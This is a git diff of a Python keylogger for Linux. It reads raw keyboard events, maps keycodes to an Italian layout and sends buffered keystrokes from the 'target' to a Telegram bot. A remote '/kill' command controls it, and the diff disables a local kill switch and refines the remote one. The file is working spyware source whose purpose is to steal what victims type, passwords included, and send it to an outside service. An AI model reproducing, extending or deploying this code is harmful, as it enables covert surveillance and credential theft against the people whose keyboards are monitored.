@@ -8,37 +8,33 @@ import time
 import threading
 import subprocess
 
-from telegramUtils import initChatID
 from telegramUtils import sendFromBuffer
-from telegramUtils import getLastMsg
 from telegramUtils import syncWithLatestUpdate
+from telegramUtils import waitNewMsg
 
 wantSHIFT = 0       #do you want in the logs [SHIFT] when target press shift    (1/0)
 debugging = 0       #get extra comments                                         (1/0)
-enableLocalKillSwitch = 1                                                     # (1/0)
+enableLocalKillSwitch = 0                                                   # (1/0)
 threshold = 20      #how many keys after sendinf the text to the telegram bot   (int)
 pathKiller = "/root/killSwitch.sh"
+
 hostname = socket.gethostname()
 machine_id = uuid.getnode()
 EVENT_FORMAT = 'llHHI'
 EVENT_SIZE   = struct.calcsize(EVENT_FORMAT)
-
 kill_flag = threading.Event()
-
-sleepFlag = 0
-
 
 KEYMAP = {
     1: "<ESC>", 2: '1', 3: '2', 4: '3', 5: '4', 6: '5',
     7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
-    12: '-', 13: '=', 14:"<backspace>", 16: 'q', 17: 'w', 18: 'e',
+    12: '\'', 13: 'ì', 14:"<backspace>", 15:'<TAB>', 16: 'q', 17: 'w', 18: 'e',
     19: 'r', 20: 't', 21: 'y', 22: 'u', 23: 'i',
     24: 'o', 25: 'p', 26:'è', 27:'+', 28:"<ENTER>", 29:"<CTRL>", 30: 'a', 31: 's', 32: 'd',
     33: 'f', 34: 'g', 35: 'h', 36: 'j', 37: 'k',
-    38: 'l', 39: 'ò', 40: 'à', 38: 'ù', 44: 'z', 45: 'x', 46: 'c', 47: 'v',
+    38: 'l', 39: 'ò', 40: 'à', 40: '\\', 43: 'ù', 44: 'z', 45: 'x', 46: 'c', 47: 'v',
     48: 'b', 49: 'n', 50: 'm',51:',',52:'.', 53:'-', 56:"<ALT>", 100:"<ALT>", 57: ' ', 68: "<LOCK>", 125:"<WIN>",
     79: '<TAST>1', 80: '<TAST>2', 81: '<TAST>3', 75: '<TAST>4', 76: '<TAST>5',
-    77: '<TAST>6', 71: '<TAST>7', 72: '<TAST>8', 73: '<TAST>9',
+    77: '<TAST>6', 71: '<TAST>7', 72: '<TAST>8', 73: '<TAST>9', 86: '<',
     105: "<leftArr>", 108: "<downArr>", 106: "<rightArr>", 103: "<upArr>", 
     42:'[SHIFT]',54:'[SHIFT]',#SHIFTS I DONT WANT TO REGISTER
 }
@@ -46,7 +42,7 @@ SHIFT_MAP = {
     '1': '!', '2': '"', '3': '£', '4': '$', '5': '%',
     '6': '&', '7': '/', '8': '(', '9': ')', '0': '=',
     '\'': '?', 'ì': '^', 'è': 'é', '+': '*', '\\': '|',
-    ',': ';', '.': ':', '-': '_',
+    ',': ';', '.': ':', '-': '_', '<': '>',
     'ò': 'ç', 'à': '°', 'ù': '§',
 
     'a': 'A', 'b': 'B', 'c': 'C', 'd': 'D', 'e': 'E',
@@ -55,17 +51,6 @@ SHIFT_MAP = {
     'p': 'P', 'q': 'Q', 'r': 'R', 's': 'S', 't': 'T',
     'u': 'U', 'v': 'V', 'w': 'W', 'x': 'X', 'y': 'Y',
     'z': 'Z', ' ': ' '
-}
-USA_SHIFT_MAP = {
-    '1': '!', '2': '"', '3': '£', '4': '$', '5': '%',
-    '6': '&', '7': '/', '8': '(', '9': ')', '0': '=',
-    '-': '?', '=': '^',
-    'q': 'Q', 'w': 'W', 'e': 'E', 'r': 'R', 't': 'T',
-    'y': 'Y', 'u': 'U', 'i': 'I', 'o': 'O', 'p': 'P',
-    'a': 'A', 's': 'S', 'd': 'D', 'f': 'F', 'g': 'G',
-    'h': 'H', 'j': 'J', 'k': 'K', 'l': 'L',
-    'z': 'Z', 'x': 'X', 'c': 'C', 'v': 'V', 'b': 'B',
-    'n': 'N', 'm': 'M', ' ': ' ',
 }
 
 # UTILS:
@@ -103,6 +88,7 @@ def saveKey(key):
         log_buffer = []
         contKeys = 0
 
+# global variables
 flagSHIFT = 0
 shift_lock = threading.Lock()
 log_buffer = []
@@ -144,10 +130,10 @@ def monitorKeys(fd):
         print("[+] monitorKeys Thread correcly working")
 
     while True:
-        #KillSwitch conditions calls
-        if kill_flag.is_set() or (checkLocalKillSwitch() and enableLocalKillSwitch):
+        #KillSwitch conditions checks
+        if kill_flag.is_set() or (enableLocalKillSwitch and checkLocalKillSwitch()):
             if debugging:
-                print("[-] kill switch matched, esco da monitorKeys")
+                print("[-] kill switch matched")
             break
 
         #getting an event
@@ -180,14 +166,20 @@ def monitorKeys(fd):
 
 def chechRemoteKillSwitch():
     while not kill_flag.is_set():
-        text = getLastMsg()
-        if text == f"/kill {machine_id}":
+        text = waitNewMsg(timeout=5)
+        if text and text == f"/kill {machine_id}":
             if debugging:
                 print("command /kill got")
+            
+            log_buffer.append(f"\nEXITING from {machine_id}")
+            sendFromBuffer(log_buffer)
+
             kill_flag.set()
             subprocess.run(["bash", pathKiller])
             return
-        time.sleep(1)
+        else:
+            if debugging:
+                print("Timeout waitNewMsg: no messagge recived, keep listening")
 
 # MAIN
 
@@ -208,8 +200,7 @@ def main():
             print(f"[!]Error: {e}", file=sys.stderr)
         sys.exit(1)
     
-    #start telegram bot
-    initChatID()
+    #sync telegram bot
     syncWithLatestUpdate()
 
     # starting messages
